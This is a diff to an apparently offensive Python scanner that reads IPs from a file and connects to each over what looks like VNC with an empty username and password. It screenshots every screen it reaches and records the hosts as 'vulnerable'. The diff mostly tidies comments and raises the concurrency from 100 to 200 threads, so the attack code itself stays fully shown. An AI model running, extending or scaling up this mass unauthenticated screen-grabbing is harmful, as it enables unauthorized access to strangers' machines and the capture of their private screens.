@@ -8,13 +8,11 @@ from filelock import FileLock
 def attemptConnect(ips):
      for ip in ips:
         try:
-            with open('nonVulnerableIPs.txt') as f: #if it has already not been found
+            with open('nonVulnerableIPs.txt') as f: #TODO: remove this O(n^2) check with something linear
                 if ip not in f.read():
                     client = api.connect('{ip}:0'.format(ip=ip),timeout=10, username='', password='')
                     client.captureScreen('screenshot_IP_{ip}.png'.format(ip=ip))
                     print('Got image from {ip}'.format(ip=ip))
-                    #TODO: issue with filelock and appending.
-                    #TODO: see: https://stackoverflow.com/questions/58028033/how-to-append-text-into-file-when-using-filelock-acquire-function-python
                     with FileLock("vulnerableIPs.txt.lock"):
                             with open('vulnerableIPs.txt', "a") as file:
                                 file.write(ip + "\n")
@@ -24,7 +22,7 @@ def attemptConnect(ips):
             with FileLock("nonVulnerableIPs.txt.lock"):
                     with open('nonVulnerableIPs.txt', "a") as file:
                         file.write(ip + "\n")
-                        pass
+                        #pass
 
 def createThread(maxThreads, ips):
         currentIndex = 0
@@ -42,11 +40,10 @@ def createThread(maxThreads, ips):
         return ips_to_solve
 
 def main():
-    #TODO: limit amount of threads multithreading
     if os.path.isfile('ips.txt'):
         print('List of ips detected.')
         with open('ips.txt') as f:
-            lines = f.readlines() # list containing lines of file
+            lines = f.readlines()
             ips = []
             for line in lines:
                 parsedLine = line.split(" ")
@@ -58,7 +55,7 @@ def main():
                     print("")
             print("Done. Proceeding with screenshotting: ")
 
-            maxThreads = 100
+            maxThreads = 200
             ips_to_multithread = createThread(maxThreads, ips)
 
             for i in range(0, maxThreads):
